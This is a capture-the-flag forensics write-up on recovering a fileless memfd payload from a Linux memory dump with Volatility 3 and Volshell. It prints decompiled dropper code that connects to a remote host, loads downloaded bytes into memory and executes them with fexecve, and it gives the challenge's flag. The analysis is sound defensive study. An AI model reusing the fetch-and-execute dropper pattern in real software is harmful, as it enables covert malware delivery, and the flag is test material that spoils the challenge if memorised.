---
title: CCSC2022 - Fakedoor Writeup
categories: [Forensics, Volatility]
tags: [volatility, forensics, ctf, writeup, linux, memfd, volshell]
author: canopus
description: Cyprus Cybersecurity Challenge (CCSC) 2022 - Fakedoor Challenge Writeup
media_subpath: /assets/img/posts/2025-09-18-fakedoor-vol3
image: banner.png
---

## Preface

A while back (3 years ago), I participated in [CCSC](https://ccsc.org.cy/) 2022 (Cyprus Cybersecurity Challenge), which serves as the primary qualification method for forming our National team for the [ECSC](https://ecsc.eu/) (European Cybersecurity Challenge) and is organized by [CyberMouflons](https://cybermouflons.com/). 

There, I encountered `Fakedoor`, the last and hardest Forensic challenge of the competition. I managed to solve it, and you can read all about it [here](https://github.com/the-rectifier/writeups/blob/master/CCSC_2022/Forensics/Fakedoor/writeup.md) (until I find a better home for those writeups...) Since Volatility 2 is now deprecated and Volatility 3 has reached [parity](https://volatilityfoundation.org/announcing-the-official-parity-release-of-volatility-3/), I thought I'd explore this again with the new framework.

For anyone who wants to follow along, you can download the memory dump from [here](https://next.alpha-carinae.xyz/s/pHxeBkRRp2Pj8yn)

## Profiles vs Symbols

The archive contains:

- `dump.mem` - Memory Snapshot
- `Debian_3.16.0-11-amd64_profile.zip` - Volatility **2** Profile

In order to be able to analyze memory snapshots, Volatility (3) needs a symbol table that contains the necessary information about the types. For Windows, these symbol files are available through Microsoft itself. However, for Linux, it's a different story altogether...

To learn about ISF (Intermediate Symbol File) creation and more on Volatility's internals, you can read my post about it: [Creating Linux Symbol Tables for Volatility: Step-by-step guide](https://www.hackthebox.com/blog/how-to-create-linux-symbol-tables-volatility)

Profiles are unique to Volatility 2 and, unfortunately, cannot be used for creating the analogous ISFs for Volatility 3. However, in the blog above, it is briefly mentioned that an effort is being made by [Abyss-W4tcher](https://github.com/Abyss-W4tcher) to populate (and maintain) a [repository](https://github.com/Abyss-W4tcher) containing symbols for popular distributions, including Debian. Based on the profile's name, we would need [this](https://github.com/Abyss-W4tcher/volatility3-symbols/blob/master/Debian/amd64/3.16.0/11/Debian_3.16.0-11-amd64_3.16.84-1_amd64.json.xz). However, there is a different approach!

We can [fetch symbols automatically](https://github.com/Abyss-W4tcher/volatility3-symbols/blob/master/Debian/amd64/3.16.0/11/Debian_3.16.0-11-amd64_3.16.84-1_amd64.json.xz) by adding the `--remote-isf-url` argument!

```bash
$> vol --remote-isf-url 'https://github.com/Abyss-W4tcher/volatility3-symbols/raw/master/banners/banners.json' -f dump.mem linux.pslist

Volatility 3 Framework 2.27.0
Progress:  100.00       Stacking attempts finished
OFFSET (V)  PID TID PPID    COMM    UID GID EUID    EGID    CREATION TIME   File output

0x88007c9112f0  1   1   0   systemd 0   0   0   0   2022-03-12 11:39:55.028000 UTC  Disabled
0x88007c910980  2   2   0   kthreadd    0   0   0   0   2022-03-12 11:39:55.028000 UTC  Disabled
0x88007c910010  3   3   2   ksoftirqd/0 0   0   0   0   2022-03-12 11:39:55.032000 UTC  Disabled
[...]
0x88007c25ca40  1651    1651    1649    bash    1000    1000    1000    1000    2022-03-12 11:41:57.520144 UTC  Disabled
0x88007c236c80  1663    1663    1649    bash    1000    1000    1000    1000    2022-03-12 11:42:03.154678 UTC  Disabled
0x88007942c9c0  1685    1685    1651    dr0pp3r 1000    1000    1000    1000    2022-03-12 11:42:32.297352 UTC  Disabled
0x88007aef32f0  1687    1687    1663    sudo    0   1000    0   1000    2022-03-12 11:42:38.179127 UTC  Disabled
0x88007a0f61d0  1688    1688    1687    avml    0   0   0   0   2022-03-12 11:42:38.204438 UTC  Disabled
```

## Dropper

We are interested in the `dr0pp3r` binary, and using the recently added `pagecache` plugins, we can check for cached files using:

```bash
$> vol -f dump.mem --filter "FilePath,dr0pp3r" linux.pagecache.Files

Volatility 3 Framework 2.27.0
Progress:  100.00       Stacking attempts finished
SuperblockAddr  MountPoint  Device  InodeNum    InodeAddr   FileType    InodePages  CachedPages FileMode    AccessTime  ModificationTime    ChangeTime  FilePath    InodeSize

0x88003710a000  /   8:1 130832  0x8800697cd1b0  REG 3   1   -rwxr-xr-x  2022-03-12 10:39:32.070966 UTC  2022-03-12 10:33:04.739038 UTC  2022-03-12 10:33:04.739038 UTC  /home/vagrant/dr0pp3r   8288
```

> Tip: Volatility caches the ISFs used, so for subsequent runs, you can omit it. You can run `vol isfinfo` to check on the cached ISFs
{: .prompt-tip }

Now that we have the `Inode` Address we can use the `InodePages` plugin to dump the executable:

```bash
$> vol -f dump.mem linux.pagecache.InodePages --inode 0x8800697cd1b0 --dump

Volatility 3 Framework 2.27.0
Progress:  100.00       Stacking attempts finished
PageVAddr   PagePAddr   MappingAddr Index   DumpSafe    Flags   Output File

0xea0001524c70  0x60a82000  0x8800697cd308  0   True    active,lru,mappedtodisk,uptodate    inode_0x8800697cd1b0.dmp

$> file inode_0x8800697cd1b0.dmp

inode_0x8800697cd1b0.dmp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, stripped
```

Opening the binary in a decompiler, we see a rather simple executable:

```c
int32_t main(int32_t argc, char** argv, char** envp) {

    int32_t argc_1 = argc
    char** argv_2 = argv
    int64_t addr = 0xb5ca8c011110002
    char* argv_1 = "b4ckd00r"
    int64_t var_20 = 0
    int32_t fd = socket(2, 1, 6)

    if (fd s< 0)
        exit(status: 1)
 noreturn

    if (connect(fd, &addr, len: 0x10) s< 0)
        exit(status: 1)
 noreturn

    int32_t fd_1 = memfd_create_wrapper("s3cr3t", 1)

    if (fd_1 s< 0)
        exit(status: 1)
 noreturn

    void buf

    while (read(fd, &buf, nbytes: 0x400) s> 0)
        write(fd: fd_1, &buf, nbytes: 0x400)

    close(fd)
    sleep(seconds: 0x14)

    if (fexecve(fd: fd_1, argv: &argv_1, envp: __environ) s>= 0)
        return 0

    exit(status: 1)
}
```

It starts by creating a `socket` and then, after converting the `addr` variable to an IP:PORT format, it seems that the malware connects to `192.168.92.11:4369`.
Afterwards, it calls the `memfd_create_wrapper()` which is a wrapper around `syscall()`:

```c
int64_t memfd_create_wrapper(int64_t arg1, int32_t arg2) {
    return syscall(0x13f, arg1, zx.q(arg2))
}
```

According to the [man page](https://man7.org/linux/man-pages/man2/memfd_create.2.html), `memfd_create` will create a file descriptor in memory and will act just like any other file!
The 2nd argument we see as `1` is the `MFD_CLOEXEC` flag. This instructs the kernel to close this file descriptor as soon as any of the `exec*` functions succeed.

It then proceeds to read some remote data from the socket and writes it into the file descriptor. There is a brief delay, and then the `fexecve()` is called. Effectively, it performs a fileless binary execution all purely in memory!

The original post showcasing the attack can be found [here](https://web.archive.org/web/20230621150048/https://0x00sec.org/t/super-stealthy-droppers/3715)

### Goal

So the goal is pretty clear: we need to recover the executable that was downloaded and then executed. However, judging by the appearance of `dr0pp3r` in the `pslist`, we can conclude that the executable did not even run, and in hindsight, the `sleep()` call is to stall a bit so that the memory could be captured before executing. So we have to look in the `dr0pp3r`'s memory. Specifically, we need to somehow isolate that file descriptor!

## The hunt for the FD

We can list the open file descriptors using the `lsof` plugin:

```bash
$> vol -f dump.mem linux.lsof --pid 1685

Volatility 3 Framework 2.27.0
Progress:  100.00       Stacking attempts finished
PID TID Process FD  Path    Device  Inode   Type    Mode    Changed Modified    Accessed    Size

1685    1685    dr0pp3r 0   /dev/pts/0  0:11    3   CHR crw--w----  2022-03-12 11:41:57.678314 UTC  2022-03-12 11:42:32.678314 UTC  2022-03-12 11:42:32.678314 UTC  0
1685    1685    dr0pp3r 1   /dev/pts/0  0:11    3   CHR crw--w----  2022-03-12 11:41:57.678314 UTC  2022-03-12 11:42:32.678314 UTC  2022-03-12 11:42:32.678314 UTC  0
1685    1685    dr0pp3r 2   /dev/pts/0  0:11    3   CHR crw--w----  2022-03-12 11:41:57.678314 UTC  2022-03-12 11:42:32.678314 UTC  2022-03-12 11:42:32.678314 UTC  0
1685    1685    dr0pp3r 4   /memfd:s3cr3t (deleted) 0:4 16458   REG -rwxrwxrwx  2022-03-12 11:42:32.471702 UTC  2022-03-12 11:42:32.471702 UTC  2022-03-12 11:42:32.467700 UTC  9216
```

We can observe the `s3cr3t` file descriptor appearing, but how do we retrieve its data?

Enter Volshell! We can interactively explore the internal structures of a process (ie, `task_struct`)

## Volshell

```bash
$> volshell -f dump.mem -l

Volshell (Volatility 3 Framework) 2.27.0
Python 3.13.7 (main, Aug 15 2025, 12:34:02) [GCC 15.2.1 20250813]
Type 'copyright', 'credits' or 'license' for more information
IPython 9.5.0 -- An enhanced Interactive Python. Type '?' for help.


Call help() to see available functions

Volshell mode        : Linux
Current Layer        : layer_name
Current Symbol Table : symbol_table_name1
Current Kernel Name  : kernel

[layer_name]>
```

This will not be a Volshell tutorial (Coming Soon?? 👀), but we will cover some basic things like displaying and interacting with structures.

We can grab the `task_struct` for any process using its `PID`, or we can construct the object using the virtual/physical addresses that are provided:

<a name="volshell_type"></a>
```python
[layer_name]> gp(pid=1685)
Out[2]: <task_struct symbol_table_name1!task_struct: layer_name @ 0x88007942c9c0 #2408>

[layer_name]> gp(virtaddr=0x88007942c9c0)
Out[4]: <task_struct symbol_table_name1!task_struct: layer_name @ 0x88007942c9c0 #2408>

[layer_name]> gp(physaddr=0x7942c9c0)
Out[7]: <task_struct symbol_table_name1!task_struct: memory_layer @ 0x7942c9c0 #2408 (Native: layer_name)>
```

> All 3 objects are **equivalent** but not all three are the same!
{: .prompt-danger }

Having an object, we can use `dt()` (`display_type()`) to 'pretty-print' it:

```python
[layer_name]> proc = gp(pid=1685)

[layer_name]> dt(proc)
symbol_table_name1!task_struct (2408 bytes) @ 0x88007942c9c0:
 0x0 :   state                         symbol_table_name1!long int                     1
 0x8 :   stack                         *symbol_table_name1!void                        0x88007c360000
 0x10 :   usage                         symbol_table_name1!atomic_t                     offset: 0x88007942c9d0
 0x14 :   flags                         symbol_table_name1!unsigned int                 1077944320
 0x18 :   ptrace                        symbol_table_name1!unsigned int                 0
 0x20 :   wake_entry                    symbol_table_name1!llist_node                   offset: 0x88007942c9e0
 0x28 :   on_cpu                        symbol_table_name1!int                          0
 0x30 :   last_wakee                    *symbol_table_name1!task_struct                 0x88007ae32a80
 0x38 :   wakee_flips                   symbol_table_name1!long unsigned int            1
 0x40 :   wakee_flip_decay_ts           symbol_table_name1!long unsigned int            4294931621
 0x48 :   wake_cpu                      symbol_table_name1!int                          1
 0x4c :   on_rq                         symbol_table_name1!int                          0
 0x50 :   prio                          symbol_table_name1!int                          120
 0x54 :   static_prio                   symbol_table_name1!int                          120
 0x58 :   normal_prio                   symbol_table_name1!int                          120
 0x5c :   rt_priority                   symbol_table_name1!unsigned int                 0
```

We are interested in the `files` field at offset `0x5e8`:
`0x5e8 :    files    *symbol_table_name1!files_struct   0x88007a5a1a40`

We can access it just like we would any other Struct field using 'dot' notation:

```python
[layer_name]> dt(proc.files)
symbol_table_name1!pointer (8 bytes) @ 0x88007942cfa8 -> 0x88007a5a1a40
 symbol_table_name1!files_struct (640 bytes) @ 0x88007a5a1a40:
       0x0 :   count                  symbol_table_name1!atomic_t       offset: 0x88007a5a1a40
       0x8 :   fdt                    *symbol_table_name1!fdtable       0x88007a51dfc0
      0x10 :   fdtab                  symbol_table_name1!fdtable        offset: 0x88007a5a1a50
      0x40 :   file_lock              symbol_table_name1!spinlock_t     offset: 0x88007a5a1a80
      0x44 :   next_fd                symbol_table_name1!int            3
      0x48 :   close_on_exec_init     symbol_table_name1!array          ['0']
      0x50 :   open_fds_init          symbol_table_name1!array          ['255']
      0x58 :   fd_array               symbol_table_name1!array          ['0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)','0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)', '0x0 (null pointer)']
```

From [bootlin](https://elixir.bootlin.com/linux/v3.16/source/include/linux/fdtable.h), the `fd_array` struct is defined as an array of `file` objects:

```c
struct file {
    union {
        struct llist_node   fu_llist;
        struct rcu_head     fu_rcuhead;
 } f_u;
    struct path     f_path;
#define f_dentry    f_path.dentry
    struct inode        *f_inode; /* cached value */
    const struct file_operations    *f_op;

 /*
 * Protects f_ep_links, f_flags.
 * Must not be taken from IRQ context.
 */
    spinlock_t f_lock;
    atomic_long_t f_count;
    unsigned int f_flags;
    fmode_t f_mode;
    struct mutex        f_pos_lock;
    loff_t f_pos;
    struct fown_struct  f_owner;
    const struct cred   *f_cred;
    struct file_ra_state    f_ra;

 u64         f_version;
#ifdef CONFIG_SECURITY
    void            *f_security;
#endif
 /* needed for tty driver, and maybe others */
    void            *private_data;

#ifdef CONFIG_EPOLL
 /* Used by fs/eventpoll.c to link all the hooks to this file */
    struct list_head    f_ep_links;
    struct list_head    f_tfile_llink;
#endif /* #ifdef CONFIG_EPOLL */
    struct address_space    *f_mapping;
} __attribute__((aligned(4))); /* lest something weird decides that 2 is OK */
```

Which contains the much-desired `f_inode` value!

To our dismay, the array is filled with null pointers, as if the process has no files open! But the `lsof` plugin did report 4 files open, and also got the name of the `memfd` file descriptor correct! So it was not misreporting! If we take a look at the file descriptor IDs, then they also make sense. File descriptor IDs are handed out sequentially, with 0, 1, 2 being default as `stdin, stdout, stderr` respectively. The `memfd` file descriptor has an ID of 4, which makes sense, because the file descriptor with ID 3 has been allocated to the `socket` and was also closed!

So if we trust that `lsof` reports correctly, then let's check out its source code to get an understanding of what it does!

## Volatility Internals (somewhat)

The `lsof.py` plugin lives at `volatility3/framework/plugins/linux/lsof.py`. Every Volatility plugin begins in the `run()` method, which most of the time will create the Rendering layout, parse some arguments, and hand over execution to the `_generator()` method.

```python
def _generator(self, pids, vmlinux_module_name):
 filter_func = pslist.PsList.create_pid_filter(pids)
        for fd_internal in self.list_fds(
            self.context, vmlinux_module_name, filter_func=filter_func
 ):
 fd_user = fd_internal.to_user()
            yield (0, dataclasses.astuple(fd_user))

    def run(self):
 pids = self.config.get("pid", None)
 vmlinux_module_name = self.config["kernel"]

 tree_grid_args = [
 ("PID", int),
 ("TID", int),
 ("Process", str),
 ("FD", int),
 ("Path", str),
 ("Device", str),
 ("Inode", int),
 ("Type", str),
 ("Mode", str),
 ("Changed", datetime.datetime),
 ("Modified", datetime.datetime),
 ("Accessed", datetime.datetime),
 ("Size", int),
 ]
        return renderers.TreeGrid(
 tree_grid_args, self._generator(pids, vmlinux_module_name)
 )
```
{: file="volatility3/framework/plugins/linux/lsof.py"}

The `_generator()` method filters out the processes to be scanned and then hands over control to the `list_fds()` method:


```python
 @classmethod
def list_fds(
    cls,
    context: interfaces.context.ContextInterface,
    vmlinux_module_name: str,
    filter_func: Callable[[int], bool] = lambda _: False,
) -> Iterable[FDInternal]:
    """Enumerates open file descriptors in tasks

 Args:
 context: The context to retrieve required elements (layers, symbol tables) from
 vmlinux_module_name: The name of the kernel module on which to operate
 filter_func: A function which takes a process object and returns True if the process
 should be ignored/filtered

 Yields:
 A FDInternal object
 """
 linuxutils_symbol_table = None
    for task in pslist.PsList.list_tasks(
 context, vmlinux_module_name, filter_func, include_threads=True
 ):
        if linuxutils_symbol_table is None:
            if constants.BANG not in task.vol.type_name:
                raise ValueError("Task is not part of a symbol table")
 linuxutils_symbol_table = task.vol.type_name.split(constants.BANG)[0]

 fd_generator = linux.LinuxUtilities.files_descriptors_for_process(
 context, linuxutils_symbol_table, task
 )

        for fd_fields in fd_generator:
            yield FDInternal(task=task, fd_fields=fd_fields)
```
{: file="volatility3/framework/plugins/linux/lsof.py"}


There are a lot of things going on here, so let's take it line by line:

```python
for task in pslist.PsList.list_tasks(
 context, vmlinux_module_name, filter_func, include_threads=True
 ):
```
{: file="volatility3/framework/plugins/linux/lsof.py"}


This is basically calling the `linux.pslist` plugin to return a list of all the processes (`task_struct`s), with the proper filter, if any.

```python
if linuxutils_symbol_table is None:
    if constants.BANG not in task.vol.type_name:
        raise ValueError("Task is not part of a symbol table")
 linuxutils_symbol_table = task.vol.type_name.split(constants.BANG)[0]
```
{: file="volatility3/framework/plugins/linux/lsof.py"}

This couple of `if` statements extract the Linux symbol table name. This is used when creating objects, much like the Windows convention `nt!_EPROCESS`. It just returns `symbol_table_name1`, as seen in [Volshell](#volshell_type)

>I know we are glancing over the `context` and `symbol_table` variables. But for this application, we can replicate their usage without knowing much about them. Stay tuned for a proper Volshell tutorial!
{: .prompt-info }

```python
fd_generator = linux.LinuxUtilities.files_descriptors_for_process(
 context, linuxutils_symbol_table, task
)

for fd_fields in fd_generator:
    yield FDInternal(task=task, fd_fields=fd_fields)\
```
{: file="volatility3/framework/plugins/linux/lsof.py"}

Finally, a call to `linux.LinuxUtilities.files_descriptors_for_process()` is made, and the resulting file descriptors are displayed. (In the form of an `FDInternal()` object)

Since that is the output we are seeing when running `linux.lsof`, we need to take a look at `files_descriptors_for_process()`:

```python
@classmethod
def files_descriptors_for_process(
    cls,
    context: interfaces.context.ContextInterface,
    symbol_table: str,
    task: interfaces.objects.ObjectInterface,
):
    try:
 files = task.files
 fd_table = files.get_fds()
        if fd_table == 0:
            return None

 max_fds = files.get_max_fds()
    except exceptions.InvalidAddressException:
        return None

    # corruption check
    if max_fds > 500000:
        return None

 file_type = symbol_table + constants.BANG + "file"

 fds = objects.utility.array_of_pointers(
 fd_table, count=max_fds, subtype=file_type, context=context
 )

    for fd_num, filp in enumerate(fds):
        if filp and filp.is_readable():
 full_path = LinuxUtilities.path_for_file(context, task, filp)

            yield fd_num, filp, full_path
```
{: file="volatility3/framework/symbols/linux/__init__.py"}

This function yields 3 distinct values:

- File Descriptor ID (`fd_num`)
- A `file *` (`filp`)
- The full path of the file (`full_path`)

But a `file *` is the structure that contains the `inode` address we need to dump data using `linux.pagecache.InodePages`!

So how do we use this function outside of the plugin system?

## Ad Hoc Functionality

This is where Volatility's amazing plugin system comes into play! Plugins are built using many modular and really specific components. And as already seen, many plugins benefit from other plugins as well. IE: when any plugin wants to grab a list of all the active processes on a system, all it needs to do is invoke `pslist.PsList.list_tasks()`.

This modularity allows developers to cross-benefit from other plugins while building their own (which in turn will benefit the rest of the ecosystem), and also users can use these small components to 'enable' functionality that is not always present (and apparent) in the default plugins, as we are about to do!

Much like in the `lsof.py`, we need to import `linux` (`from volatility3.framework.symbols import linux`) to be able to use it.

The method signature requires:

- `context`: Can be retrieved from Volshell using `self.context`
- `symbol_table`: Is `symbol_table_name1` as shown earlier, but can also be retrieved using `self.current_symbol_table` (if not changed)
- `task`: Already shown how to be retrieved `gp(pid=...)`

Let's get to it:

```python
[layer_name]> from volatility3.framework.symbols import linux

[layer_name]> proc = gp(pid=1685)

[layer_name]> fd_gen = linux.LinuxUtilities.files_descriptors_for_process(
         ...: self.context,
         ...: self.current_symbol_table,
         ...: proc)

[layer_name]> for fd in fd_gen:
         ...:     print(fd)
         ...:
(0, 149535628454912, '/dev/pts/0')
(1, 149535628454912, '/dev/pts/0')
(2, 149535628454912, '/dev/pts/0')
(4, 149534504862464, '/memfd:s3cr3t (deleted)')
```

Now that we have our `file *` `0x8800370b4300`, we can manually construct a `file` object on that address, and since we will get a valid object, we can pretty-print it like we did earlier!

## Something about Layers

> I probably should've done the Volshell tutorial before this, since we are venturing deeper than anticipated... But bear with me here...

Objects are created on top of Layers, and to be valid in terms of data containment or pointer direction, they must be created on their "own" Layer. Layers are containers of objects, addresses, and data. Each process (in the virtual address space) has its own Layer, much like Virtual Address Space. The same principle applies to the Kernel as well.

The `[layer_name]>` prompt means that we are currently switched to the Layer named: `layer_name`, which is the Kernel's Layer!

Since the `task_struct` and `file` objects reside in **Kernel Memory**, their appropriate Layer is the Kernel Layer! (Since it contains the correct information, and their pointers are valid).

> Objects can point outside of their Layer, or can be valid on more than one Layer, but that's a story for another time
{: .prompt-info }

## Constructing Objects

We can construct objects by calling the `self.context.object()` method as such:

```python
[layer_name]> file = self.context.object(
         ...: object_type=f"{self.current_symbol_table}!file",
         ...: layer_name='layer_name',
         ...: offset=0x8800370b4300,
         ...: )

[layer_name]> file
Out[3]: <struct_file symbol_table_name1!file: layer_name @ 0x8800370b4300 #256>
```

> The `!` in the `object_type` is technically a `constants.BANG`, and hardcoding the Layer name is bad practice!
{: .prompt-warning }

Now that we have our `file` object, we can display it and interact with it just like any other `vol-obj`:

```python
[layer_name]> dt(file)
symbol_table_name1!file (256 bytes) @ 0x8800370b4300:
   0x0 :   f_u               symbol_table_name1!unnamed_ffeb8657d0d287cf     offset: 0x8800370b4300
  0x10 :   f_path            symbol_table_name1!path                         offset: 0x8800370b4310
  0x20 :   f_inode           *symbol_table_name1!inode                       0x88007a5010a0
  0x28 :   f_op              *symbol_table_name1!file_operations             0xffff8161fa40
  0x30 :   f_lock            symbol_table_name1!spinlock_t                   offset: 0x8800370b4330
  0x38 :   f_count           symbol_table_name1!atomic64_t                   offset: 0x8800370b4338
  0x40 :   f_flags           symbol_table_name1!unsigned int                 32770
  0x44 :   f_mode            symbol_table_name1!unsigned int                 393247
  0x48 :   f_pos_lock        symbol_table_name1!mutex                        offset: 0x8800370b4348
  0x70 :   f_pos             symbol_table_name1!long long int                9216
  0x78 :   f_owner           symbol_table_name1!fown_struct                  offset: 0x8800370b4378
  0x98 :   f_cred            *symbol_table_name1!cred                        0x880036c5e580
  0xa0 :   f_ra              symbol_table_name1!file_ra_state                offset: 0x8800370b43a0
  0xc0 :   f_version         symbol_table_name1!long long unsigned int       0
  0xc8 :   f_security        *symbol_table_name1!void                        0x0 (null pointer)
  0xd0 :   private_data      *symbol_table_name1!void                        0x0 (null pointer)
  0xd8 :   f_ep_links        symbol_table_name1!list_head                    offset: 0x8800370b43d8
  0xe8 :   f_tfile_llink     symbol_table_name1!list_head                    offset: 0x8800370b43e8
  0xf8 :   f_mapping         *symbol_table_name1!address_space               0x88007a5011f8
```

## Flag

Lo and Behold, the much desired `f_inode`:

```bash
$> vol -f dump.mem linux.pagecache.InodePages --inode 0x88007a5010a0 --dump

Volatility 3 Framework 2.27.0
Progress:  100.00       Stacking attempts finished
PageVAddr   PagePAddr   MappingAddr Index   DumpSafe    Flags   Output File

0xea0001528da0  0x60bac000  0x88007a5011f8  0   True    active,dirty,lru,referenced,savepinned,swapbacked,uptodate  inode_0x88007a5010a0.dmp
0xea0001528dd8  0x60bad000  0x88007a5011f8  1   True    active,dirty,lru,referenced,savepinned,swapbacked,uptodate  inode_0x88007a5010a0.dmp
0xea0001528e48  0x60baf000  0x88007a5011f8  2   True    dirty,lru,referenced,savepinned,swapbacked,uptodate inode_0x88007a5010a0.dmp
```

We can see the binary spans multiple pages that had to be retrieved so that it could be dumped. Let's load it up in a decompiler! 

```c
int32_t main(int32_t argc, char** argv, char** envp)
    int32_t argc_1 = argc
    char** argv_1 = argv

    for (int32_t i = 0; 0x21 u> i; i += 1)
        int32_t temp0_1
        int32_t temp1_1
 temp0_1:temp1_1 = sx.q(i)
        uint32_t rdx_2 = temp0_1 u>> 0x1c
        *(sx.q(i) + &b) ^= *(sx.q(((temp1_1 + rdx_2) & 0xf) - rdx_2) + &a)

    fputs(str: &b, fp: fopen(filename: "/dev/null", mode: "w+"))
    return 0
```

It's a simple XOR between two strings:

```c
00601020 a:
00601020 d5 d6 c1 08 58 3a 30 37 d4 08 35 6b 3b 9b 33 17 ....X:07..5k;.3.
00601030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
00601040 b:
00601040  96 95 92 4b 23 57 03 5a b2 6c 6a 09 0f f8 58 73 ...K#W.Z.lj...Xs
00601050 e5 e6 b3 3d 07 0e 42 04 8b 6b 05 5b 57 ba 12 36 ...=..B..k.[W..6
00601060 a8                                               .
```

```bash
$> xortool-xor -h 9695924b2357035ab26c6a090ff85873e5e6b33d070e42048b6b055b57ba1236a8 -h d5d6c108583a3037d408356b3b9b3317

CCSC{m3mfd_b4ckd00r5_4r3_c00l!!!}
```

## Closing

I really enjoyed this challenge, and as stated in the original Writeup, it was my favorite of the competition, so a big thank you to `icydux` for creating it!

